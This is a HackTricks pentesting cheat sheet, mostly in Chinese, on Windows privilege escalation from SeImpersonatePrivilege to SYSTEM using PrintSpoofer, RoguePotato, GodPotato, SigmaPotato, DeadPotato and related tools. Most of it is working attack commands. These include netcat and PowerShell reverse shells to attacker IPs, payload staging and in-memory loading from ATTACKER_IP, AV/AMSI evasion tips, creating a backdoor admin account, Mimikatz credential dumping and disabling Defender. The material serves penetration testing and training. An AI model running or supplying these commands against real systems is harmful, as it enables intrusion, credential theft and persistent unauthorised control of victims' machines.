# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** 在 Windows Server 2019 和 Windows 10 build 1809 及更高版本上不起作用。 但是， [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**，** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**，** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**，** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**，** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**，** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** 可用于 **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** 级别访问权限。 这篇 [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) 深入介绍了 `PrintSpoofer` 工具，该工具可用于在 JuicyPotato 无法工作的 Windows 10 和 Server 2019 主机上滥用 impersonation privileges。

> [!TIP]
> 一个在 2024–2025 年间经常维护的现代替代方案是 SigmaPotato（GodPotato 的一个分支），它增加了内存/.NET reflection 的使用并扩展了操作系统支持。请参见下面的快速用法和参考仓库。

相关页面（用于背景和手动技术）：

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## 要求和常见陷阱

下面所有技术都依赖于从具有以下任一权限的上下文滥用一个 impersonation-capable privileged service：

- SeImpersonatePrivilege（最常见）或 SeAssignPrimaryTokenPrivilege
- 如果 token 已经具有 SeImpersonatePrivilege，则不需要高完整性（这在许多服务账户中是典型情况，例如 IIS AppPool、MSSQL 等）

快速检查权限：
```cmd
whoami /priv | findstr /i impersonate
```
Operational notes:

- 如果你的 shell 在受限 token 下运行且缺少 SeImpersonatePrivilege（在某些场景下常见于 Local Service/Network Service），使用 FullPowers 恢复该账户的默认权限，然后运行 Potato。示例： `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer 需要 Print Spooler 服务运行并可通过本地 RPC 端点 (spoolss) 访问。在因 PrintNightmare 而禁用 Spooler 的加固环境中，优先使用 RoguePotato/GodPotato/DCOMPotato/EfsPotato。
- RoguePotato 需要可通过 TCP/135 访问的 OXID resolver。如果出站受限，使用重定向器/端口转发器（见下方示例）。旧版本需要 -f 标志。
- EfsPotato/SharpEfsPotato 利用 MS-EFSR；如果某个 pipe 被阻止，尝试替代 pipe（lsarpc、efsrpc、samr、lsass、netlogon）。
- 在 RpcBindingSetAuthInfo 期间出现错误 0x6d3 通常表示未知/不受支持的 RPC 身份验证服务；尝试不同的 pipe/传输或确保目标服务正在运行。
- 像 DeadPotato 这样的“万金油”分支捆绑额外的 payload 模块（Mimikatz/SharpHound/Defender off），会触及磁盘；与精简原版相比，预计会有更高的 EDR 检测率。

## 快速演示

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
注意：
- 你可以使用 -i 在当前控制台启动交互式进程，或使用 -c 运行一行命令。
- 需要 Spooler 服务。如果被禁用，将会失败。

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
如果出站端口 135 被阻止，请在你的 redirector 上通过 socat pivot OXID resolver：
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato 是在 2022 年末发布的较新 COM 滥用原语，针对 **PrintNotify** 服务而非 Spooler/BITS。该二进制文件实例化 PrintNotify COM 服务器，注入一个伪造的 `IUnknown`，然后通过 `CreatePointerMoniker` 触发特权回调。当 PrintNotify 服务（以 **SYSTEM** 运行）回连时，进程会复制返回的 token 并以完整权限启动所提供的 payload。

Key operational notes:

* 适用于 Windows 10/11 以及 Windows Server 2012–2022，只要安装了 Print Workflow/PrintNotify 服务（即使在 PrintNightmare 事件后禁用传统 Spooler 时，该服务仍然存在）。
* 要求调用上下文具有 **SeImpersonatePrivilege**（典型场景为 IIS APPPOOL、MSSQL 以及 scheduled-task 服务账户）。
* 接受直接命令或交互模式，使操作者可以停留在原始控制台内。示例：

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* 因为它完全基于 COM，不需要 named-pipe 侦听器或外部重定向器，因此在 Defender 阻止 RoguePotato’s RPC binding 的主机上可作为无缝替代。

像 Ink Dragon 这样的操作者在通过 SharePoint 获取 ViewState RCE 后，会立即触发 PrintNotifyPotato，从 `w3wp.exe` 工作进程切换到 SYSTEM，然后再安装 ShadowPad。

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
提示：如果一个 pipe 失败或被 EDR 阻止，尝试其他受支持的 pipes：
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
注意：
- 在存在 SeImpersonatePrivilege 时，适用于 Windows 8/8.1–11 和 Server 2012–2022。
- 获取与已安装运行时匹配的二进制文件（例如，在现代 Server 2022 上使用 `GodPotato-NET4.exe`）。
- 如果你的初始执行原语是具有短超时的 webshell/UI，请将 payload 暂存为脚本，并让 GodPotato 运行它，而不是使用长的内联命令。

Quick staging pattern from a writable IIS webroot:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato 提供了两个变体，针对默认使用 RPC_C_IMP_LEVEL_IMPERSONATE 的服务 DCOM 对象。构建或使用提供的二进制文件并运行你的命令:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (updated GodPotato fork)

SigmaPotato 添加了现代化的便利功能，例如通过 .NET reflection 进行 in-memory execution，以及一个 PowerShell reverse shell helper。
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- 内置 reverse shell 标志 `--revshell` 并移除了 1024 字符 PowerShell 限制，以便一次性触发长的 AMSI-bypassing payloads。
- 对 Reflection 友好的语法 (`[SigmaPotato]::Main()`)，以及通过 `VirtualAllocExNuma()` 提供的基础 AV 绕过技巧以扰乱简单的启发式检测。
- 提供单独的 `SigmaPotatoCore.exe`，针对 .NET 2.0 编译，适用于 PowerShell Core 环境。

### DeadPotato (2024 GodPotato rework with modules)

DeadPotato 保留了 GodPotato 的 OXID/DCOM impersonation 链，并内置了 post-exploitation 助手，使操作者可以立即获取 SYSTEM 并在无需额外工具的情况下执行 persistence/collection。

Common modules (all require SeImpersonatePrivilege):

- `-cmd "<cmd>"` — 以 SYSTEM 身份启动任意命令。
- `-rev <ip:port>` — 快速 reverse shell。
- `-newadmin user:pass` — 创建本地管理员以用于 persistence。
- `-mimi sam|lsa|all` — drop 并运行 Mimikatz 以 dump credentials（会触及磁盘，噪声大）。
- `-sharphound` — 以 SYSTEM 身份运行 SharpHound collection。
- `-defender off` — 关闭 Defender 实时防护（噪声很大）。

Example one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
因为它随附额外的二进制文件，预计会触发更多 AV/EDR 警报；当需要隐蔽时，请使用更精简的 GodPotato/SigmaPotato。

## References

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [HTB: Job — LibreOffice macro → IIS webshell → GodPotato to SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
